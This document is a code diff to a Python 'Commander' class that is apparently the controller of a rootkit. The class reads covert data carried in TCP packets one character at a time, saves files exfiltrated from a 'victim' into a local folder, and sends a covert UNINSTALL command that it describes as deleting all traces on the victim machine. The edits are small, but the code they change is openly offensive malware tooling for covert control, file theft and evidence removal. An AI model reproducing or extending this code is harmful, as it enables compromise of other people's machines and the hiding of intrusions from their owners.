@@ -22,7 +22,7 @@ class Commander:
         self.output_buffer = ""
         self.running = True
         
-        # Watch-related variables
+        # Watch-related variables (MUST BE INITIALIZED)
         self.watch_buffer = ""
         self.watch_receiving = False
         self.watch_current_file = None
@@ -104,6 +104,7 @@ class Commander:
         self.watch_buffer = ""
         self.watch_receiving = False
         self.watch_current_file = None
+        self.watch_file_size = 0
         
         def process_packet(pkt):
             if pkt.haslayer(TCP) and pkt[TCP].dport == self.rx_port:
@@ -112,6 +113,7 @@ class Commander:
                     char = chr(char_code)
                     
                     with self.output_lock:
+                        # ALWAYS add to watch buffer first to detect markers
                         self.watch_buffer += char
                         
                         # Check for watch file START marker
@@ -156,9 +158,11 @@ class Commander:
         watch_dir = "./watched"
         os.makedirs(watch_dir, exist_ok=True)
         
+        # Create safe filename from path
         safe_name = self.watch_current_file.replace('/', '_').replace('\\', '_').replace(':', '_')
         save_path = os.path.join(watch_dir, safe_name)
         
+        # Extract content by removing markers
         content = self.watch_buffer
         content = re.sub(r'\[WATCH FILE\] .+?\n', '', content)
         content = re.sub(r'\[SIZE\] \d+\n', '', content)
@@ -362,8 +366,11 @@ class Commander:
         confirm = input("Are you sure you want to uninstall? (y/n): ").strip().lower()
         if confirm == 'y':
             print("[*] Uninstalling rootkit from victim...")
+            print("[*] This will delete all traces on the victim machine")
             self.send_covert_command("UNINSTALL")
-            self.display_output(timeout=3)
+            print("[*] Waiting for confirmation...")
+            time.sleep(2)
+            print("[+] Uninstall signal sent.")
             self.is_connected = False
         else:
             print("[!] Uninstall cancelled.")
